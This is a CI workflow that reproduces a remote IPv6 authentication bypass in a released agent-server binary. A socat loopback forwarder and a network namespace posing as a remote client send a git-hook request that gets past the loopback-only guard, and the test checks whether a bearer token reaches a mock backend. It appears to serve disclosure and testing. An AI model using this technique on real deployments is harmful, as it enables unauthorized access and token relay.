name: Box git-hook IPv6 proxy auth bypass
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
jobs:
  reproduce:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Reproduce production socat loopback-auth bypass with external IPv6 namespace
        shell: bash
        run: |
          set -euo pipefail
          sudo apt-get update -qq >/dev/null
          sudo apt-get install -y -qq socat >/dev/null
          rm -rf /tmp/ghb && mkdir -p /tmp/ghb/work
          O=box-githook-socat-loopback-bypass.txt
          git ls-remote --tags --refs https://github.com/ariana-dot-dev/agent-server.git | awk '{print $2}' | sed 's#refs/tags/##' | grep -E '^agent-server-v[0-9].*-ascii-prod[0-9]+$' | sort -V > /tmp/ghb/tags
          tag=$(tail -1 /tmp/ghb/tags)
          curl -fL "https://github.com/ariana-dot-dev/agent-server/releases/download/$tag/ascii-agents-server-linux-x64" -o /tmp/ghb/agent; chmod +x /tmp/ghb/agent
          cat >/tmp/ghb/backend.py <<'PY'
          from http.server import BaseHTTPRequestHandler,HTTPServer
          from pathlib import Path
          class H(BaseHTTPRequestHandler):
            def do_POST(self):
              n=int(self.headers.get('content-length','0') or 0); b=self.rfile.read(n)
              with Path('/tmp/ghb/backend.log').open('a') as f: f.write('PATH='+self.path+'\nAUTH='+self.headers.get('authorization','')+'\nBODY='+b.decode('utf8','replace')+'\n---\n')
              out=b'{"exitCode":63,"marker":"SOCAT_BYPASS_BACKEND"}'; self.send_response(200); self.send_header('content-type','application/json'); self.send_header('content-length',str(len(out))); self.end_headers(); self.wfile.write(out)
            def log_message(self,*a): pass
          HTTPServer(('127.0.0.1',19096),H).serve_forever()
          PY
          python3 /tmp/ghb/backend.py & bpid=$!
          export MACHINE_ID=box-socat-bypass-test SHARED_KEY=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef WORK_DIR=/tmp/ghb/work HOME=/tmp/ghb/work ASCII_PORT=18930 IS_SANDBOX=1
          export ASCII_API_URL=http://127.0.0.1:19096 ASCII_TOKEN='SOCAT_BYPASS_TOKEN_MARKER' BACKEND_URL=http://127.0.0.1:19096 BOX_CLI_API_URL=http://127.0.0.1:19096
          /tmp/ghb/agent >/tmp/ghb/agent.log 2>&1 & apid=$!
          # Exact production pattern from guest-runtime-setup.sh, different port only.
          socat TCP6-LISTEN:18931,fork,reuseaddr,ipv6only=1 TCP4:127.0.0.1:18930 >/tmp/ghb/socat.log 2>&1 & spid=$!
          trap 'sudo ip netns del boxext 2>/dev/null || true; kill $apid $spid $bpid 2>/dev/null || true' EXIT
          for i in $(seq 1 100); do curl -s --max-time 1 http://127.0.0.1:18930/health >/dev/null 2>&1 && break; sleep .2; done
          payload='{"hookType":"pre_commit","repoPath":"SOCAT_REMOTE_ATTACKER_PATH","branch":"SOCAT_REMOTE_BRANCH","stagedFiles":["SOCAT_REMOTE_CANARY"]}'
          {
            echo "TAG=$tag"; echo "SHA256=$(sha256sum /tmp/ghb/agent|awk '{print $1}')"
            echo '=== exact application guard evidence ==='
            strings -a -n 5 /tmp/ghb/agent | grep -E -B 4 -A 10 'new Set\(\["/git-hook-event"\]\)|requestIP|127\.0\.0\.1.*::1' | tail -n 80 || true
            echo '=== direct non-allowed peer control ==='
          } >$O
          # 127.0.0.2 is in the OS loopback block but is NOT in the application's exact allowlist.
          : >/tmp/ghb/direct.body
          direct=$(curl -sS --interface 127.0.0.2 --max-time 3 -o /tmp/ghb/direct.body -w '%{http_code}' -H 'content-type: application/json' --data-binary "$payload" http://127.0.0.1:18930/git-hook-event 2>/dev/null || printf 000)
          echo "DIRECT_SOURCE_127.0.0.2 status=$direct body=$(cat /tmp/ghb/direct.body)" >>$O
          # Create a separate network namespace to represent a genuinely remote IPv6 client.
          sudo ip netns add boxext
          sudo ip link add boxhost type veth peer name boxclient
          sudo ip link set boxclient netns boxext
          sudo ip -6 addr add 2001:db8:4242::1/64 dev boxhost
          sudo ip link set boxhost up
          sudo ip netns exec boxext ip link set lo up
          sudo ip netns exec boxext ip -6 addr add 2001:db8:4242::2/64 dev boxclient
          sudo ip netns exec boxext ip link set boxclient up
          echo '=== external IPv6 client through production-style socat ===' >>$O
          : >/tmp/ghb/proxy.body
          proxy=$(sudo ip netns exec boxext curl -g -sS --max-time 5 -o /tmp/ghb/proxy.body -w '%{http_code}' -H 'content-type: application/json' --data-binary "$payload" 'http://[2001:db8:4242::1]:18931/git-hook-event' 2>/dev/null || printf 000)
          echo "EXTERNAL_IPV6_SOURCE_2001:db8:4242::2 status=$proxy body=$(cat /tmp/ghb/proxy.body)" >>$O
          echo '=== backend receipt ===' >>$O; cat /tmp/ghb/backend.log >>$O 2>/dev/null || true
          echo '=== agent relevant ===' >>$O; grep -Eai 'git-hook|Relaying|Backend response|Listening' /tmp/ghb/agent.log | tail -n 300 >>$O || true
          if [ "$direct" = 404 ] && [ "$proxy" = 200 ] && grep -q 'AUTH=Bearer SOCAT_BYPASS_TOKEN_MARKER' /tmp/ghb/backend.log 2>/dev/null; then echo 'REMOTE_IPV6_TO_LOOPBACK_AUTH_BYPASS=CONFIRMED' >>$O; else echo 'REMOTE_IPV6_TO_LOOPBACK_AUTH_BYPASS=NOT_CONFIRMED' >>$O; fi
          cat $O
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: box-githook-socat-loopback-bypass
          path: box-githook-socat-loopback-bypass.txt
          if-no-files-found: error